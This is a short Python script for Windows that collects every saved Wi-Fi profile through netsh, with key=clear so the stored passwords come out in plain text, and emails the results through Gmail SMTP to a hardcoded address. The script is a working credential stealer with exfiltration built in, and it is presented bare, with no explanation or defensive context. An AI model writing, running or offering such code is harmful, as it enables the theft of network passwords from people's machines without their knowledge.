#!/usr/bin/env python3

import subprocess
import smtplib
import re


def sendmail(email, password, message):
	server = smtplib.SMTP_SSL('smtp.gmail.com', 465) #server = smtplib.SMTP()
	#server.starttls() #port 587
	server.login(email, password)
	server.sendmail(email, email, message)
	server.quit()


def retrieve_wifi_profile():
	command = 'netsh wlan show profile'
	access_points = subprocess.check_output(command, shell=True)	
	access_point_names_list = re.findall("(?:Profile\s*:\s)(.*)", access_points.decode())

	result = ""
	for access_point in access_point_names_list:
		command = 'netsh wlan show profile "' + access_point + '" key=clear'
		command_result = subprocess.check_output(command, shell=True)
		command_result = command_result.decode()
		result = result + command_result

	return result		



email = 'abcd@123.com'
password = 'xxxxxxxxxxxx'
result = retrieve_wifi_profile()
sendmail(email, password, result)

